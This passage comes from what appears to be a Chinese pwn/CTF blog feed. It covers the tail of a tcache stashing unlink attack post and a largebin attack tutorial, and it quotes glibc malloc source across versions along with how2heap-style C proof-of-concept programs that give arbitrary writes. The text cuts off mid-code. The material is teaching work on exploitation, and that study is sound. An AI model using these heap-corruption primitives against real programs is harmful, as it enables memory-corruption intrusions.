class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">&amp;victim, s2+<span class="number">0x3d0</span>, t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *r = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">r[<span class="number">0</span>] = <span class="number">0xaa</span>;</span><br><span class="line">r[<span class="number">1</span>] = <span class="number">0xbb</span>;</span><br><span class="line">r[<span class="number">2</span>] = <span class="number">0xcc</span>;</span><br><span class="line">r[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim2&#x27;s value: 0x%lx\n&quot;</span>,</span><br><span class="line">victim2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://github.com/StarCross-Tech/heap_exploit_2.31" >https://github.com/StarCross-Tech/heap_exploit_2.31<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;tcache stashing unlink attack作为house of pig的基础，所在这一篇更新完了就会跟新house of pig以及SROP。&lt;/p&gt;
&lt;p&gt;首先，这种利用方式需要的条件就是存在calloc来申请chunk。&lt;/p&gt;
&lt;h2 id=&quot;在Gli</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="tcache stashing unlink attack" scheme="https://cv196082.gitee.io/tags/tcache-stashing-unlink-attack/"/>
    
  </entry>
  
  <entry>
    <title>largebin attack</title>
    <link href="https://cv196082.gitee.io/2022/02/23/largebin-attack/"/>
    <id>https://cv196082.gitee.io/2022/02/23/largebin-attack/</id>
    <published>2022-02-23T05:35:47.000Z</published>
    <updated>2022-02-23T08:26:22.572Z</updated>
    
    <content type="html"><![CDATA[<p>关于largebin的原理这里就只给一张图吧，也是在网上找的(我懒得画)。</p><p><img src="/images/20190516131203-242dd8f2-7799-1.png" alt="20190516131203-242dd8f2-7799-1"></p><p>largebin一直是容易被忽略的利用方式(可能只是我这样吧)，在此之前我一直觉得largebin不会出现直到最近的比赛怎么全是这玩意，所以又下来学习了一遍。</p><h2 id="Glibc2-23到Glibc2-27下的largebin-attack"><a href="#Glibc2-23到Glibc2-27下的largebin-attack" class="headerlink" title="Glibc2.23到Glibc2.27下的largebin attack"></a>Glibc2.23到Glibc2.27下的largebin attack</h2><p>其实Glibc2.27和Glibc2.23的利用方式都差不多，只不过在2.27里增加了tcache机制，所以想实现largebin attack要么占满tcache，或则大于tcache范围。</p><p>下面源码是当unsorted bin 当作的chunk进入large bin的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line">bck = bin_at (av, victim_index); </span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)               </span><br><span class="line">        &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd)) </span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">            == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd; </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>这里的第二个if判断的就是size如果小于最小的size的时候发生的事情，但是那里的内容相较于下面不是很好利用。所以直接看下面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">        == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd; </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>这里就是我们主要的利用代码，这里的if判断的是找到相同size的chunk发生什么，但是我们真正利用的代码其实是else里面的。现在假设我们存在一个已经在large bin的chunk1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = target<span class="number">-0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和一个在unsorted bin当中的chunk2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x460</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们下一次malloc一个size大于0x460的chunk时那么chunk2就会进入large bin，此时就会执行以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>翻译过来就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;fd_nextsize = chunk1;</span><br><span class="line">chunk2-&gt;bk_nextsize = chunk1-&gt;bk_nextsize; <span class="comment">// chunk1-&gt;bk_nextsize = target-0x20</span></span><br><span class="line"><span class="comment">// 这一步过后，chunk2-&gt;bk_next_size也就变成了target-0x20</span></span><br><span class="line">chunk1-&gt;bk_nextsize = chunk2;</span><br><span class="line">chunk2-&gt;bk_nextsize-&gt;fd_nextsize = chunk2;</span><br><span class="line"><span class="comment">// 所以这一步最终的形式其实是</span></span><br><span class="line">*(target<span class="number">-0x20</span>)-&gt;fd_nextsize = chunk2;</span><br></pre></td></tr></table></figure><p>victim这样就在target位置写上了chunk2的地址。</p><p>另外在这里还存在另一个可以任意地址写入堆地址的地方：</p><p>此时chunk1变为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = target<span class="number">-0x10</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bck = fwd-&gt;bk;   上面执行完之后有这样一句</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>翻译过来也就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;bk = target<span class="number">-0x10</span>;</span><br><span class="line">chunk2-&gt;fd = chunk1;</span><br><span class="line">chunk1-&gt;bk = chunk2;</span><br><span class="line">*(target<span class="number">-0x10</span>)-&gt;fd = chunk2;</span><br></pre></td></tr></table></figure><p>也就是如果同时修改了bk和bk_nextsize的话可以同时修改两处地址的值为堆地址。</p><h2 id="Glibc2-29下的largebin-attack"><a href="#Glibc2-29下的largebin-attack" class="headerlink" title="Glibc2.29下的largebin attack"></a>Glibc2.29下的largebin attack</h2><p>这里的攻击方式和上面的很类似，首先看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    victim_index = largebin_index (size); </span><br><span class="line">      bck = bin_at (av, victim_index);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">  &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">              <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                &#123;</span><br><span class="line">                  fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">// but size must be different</span></span><br><span class="line">              <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br><span class="line">                &#125;</span><br><span class="line">              bck = fwd-&gt;bk;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure><p>其实很明显的可以看出来下面仍然存在相应的漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br></pre></td></tr></table></figure><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>在这里说一下unsorted bin attack，虽然在2.29出来之后基本就没法利用了但是害怕题目出的libc版本在以往的版本然后又限制大小所以这里还是提一下unsorted bin attack</p><p>这里就不提出全部源码就把存在漏洞的两行提出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>可以看出来如果我们可以控制unsorted_chunks (av)的bk指针，那就可以向任意地址写入堆地址了。</p><p>这里直接给出how2heap当中的poc吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stackn&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attacknn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %ldnn&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, we allocate first normal chunk on the heap at: %pn&quot;</span>,p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()nn&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">           <span class="string">&quot;point to %pn&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointern&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been &quot;</span></span><br><span class="line">           <span class="string">&quot;rewrite:n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %pn&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写的很详细，如果看不懂可以-g编译调试一下。</p><h2 id="Glibc2-31下的largebin-attack"><a href="#Glibc2-31下的largebin-attack" class="headerlink" title="Glibc2.31下的largebin attack"></a>Glibc2.31下的largebin attack</h2><p>先看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">        &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">            == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span 